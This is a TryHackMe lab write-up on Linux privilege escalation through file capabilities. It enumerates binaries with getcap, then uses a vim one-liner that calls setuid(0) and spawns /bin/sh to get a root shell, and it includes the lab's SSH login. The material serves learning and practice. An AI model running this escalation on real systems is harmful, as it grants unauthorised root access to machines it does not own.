# TryHackMe — Linux Privilege Escalation (Capabilities Task)

**Platform:** TryHackMe  
**Room:** Linux Privilege Escalation  
**Task:** Privilege Escalation — SUID  
**Difficulty:** Medium  

> **Note:** This is a guided TryHackMe room, not an independent CTF challenge.
> The target credentials (karen / Password1) were provided by the platform.
> The purpose of this writeup is to document the techniques practiced and
> reinforce learning, not to demonstrate blind exploitation.

---

## Connection

Connected to the target via SSH using the provided credentials:

```bash
ssh karen@<TARGET_IP>
# Password: Password1
```

Upgraded to a fully interactive shell using Python3:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---
## Question 1 - How many binaries have set capabilities?
## Question 2 - What other binary (other than vim) can be used through its capabilities?

### Using `getcap`

As covered in the room, searched for list enabled capabilities with `getcap` tool:

```bash
$ getcap -r / 2>/dev/null  
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep  
/usr/bin/traceroute6.iputils = cap_net_raw+ep  
/usr/bin/mtr-packet = cap_net_raw+ep  
/usr/bin/ping = cap_net_raw+ep  
/home/karen/vim = cap_setuid+ep  
/home/ubuntu/view = cap_setuid+ep
```

Compared the results against [GTFOBins](https://gtfobins.github.io) using the 'Capabilities' filter. 
We can use 'python' via vim or view.

## Launch a root shell

```bash
$ ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

And now we have root shell.

---
## Question 3 - What is the content of the flag4.txt file?

### Located the flag file using `find`:

```bash
# find / -name flag4.txt
/home/ubuntu/flag4.txt
```

```bash
# cat /home/ubuntu/flag4.txt
<FLAG>
```